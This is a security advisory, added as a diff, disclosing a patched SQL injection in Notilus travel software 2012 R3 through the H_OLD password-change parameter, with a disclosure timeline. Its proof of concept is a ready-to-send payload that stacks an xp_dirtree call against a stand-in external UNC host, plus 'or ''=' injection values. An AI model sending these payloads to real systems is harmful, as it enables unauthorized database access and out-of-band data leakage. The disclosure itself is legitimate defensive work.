@@ -1,0 +1,64 @@
+Exploit Title: Notilus SQL injection
+Product: Notilus travel solution software
+Vulnerable Versions: 2012 R3
+Tested Version: 2012 R3
+Advisory Publication: 03/06/2016
+Vulnerability Type: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') [CWE-89]
+CVE Reference: NONE
+Credit: Alex Haynes
+
+Advisory Details:
+
+
+(1) Vendor & Product Description
+--------------------------------
+
+Vendor: DIMO Software
+
+
+Product & Version:
+Notilus travel solution software v2012 R3
+
+
+Vendor URL & Download:
+http://www.notilus.com/
+
+
+Product Description:
+"DIMO Software is the European leader on the Travel and Expense Management market. We publish the Notilus solution, a simple efficient software to manage the entire business travel process: travel orders, online and offline booking, expense reports, supplier invoices, car fleet, mobile telephones, etc."
+
+
+(2) Vulnerability Details:
+--------------------------
+The Notilus software is vulnerable to SQL injection attacks, specifically in the password modification fields.
+
+Proof of concept:
+
+POST TO /company/profilv4/Password.aspx
+
+Vulnerable parameter: H_OLD
+
+Payload:
+ACTION=1&H_OLD=mypass'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\testdomain.mydo'%2b'main.com\vps'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&H_NEW1=%27+or+%27%27%3D%27&H_NEW2=%27+or+%27%27%3D%27
+
+
+
+
+(3) Advisory Timeline:
+----------------------
+15/02/16 - First Contact: vendor requests details of vulnerability
+03/03/16 - Follow up to vendor to inquire about availability of a fix.
+03/03/16 - vendor responds that fix will be available 16/03/16.
+16/03/16 - Vendor releases patch.
+
+
+
+
+(4)Solution:
+------------
+Patch to latest available 2012 R3 branch or upgrade to version 2016.
+
+
+(5) Credits:
+------------
+Discovered by Alex Haynes
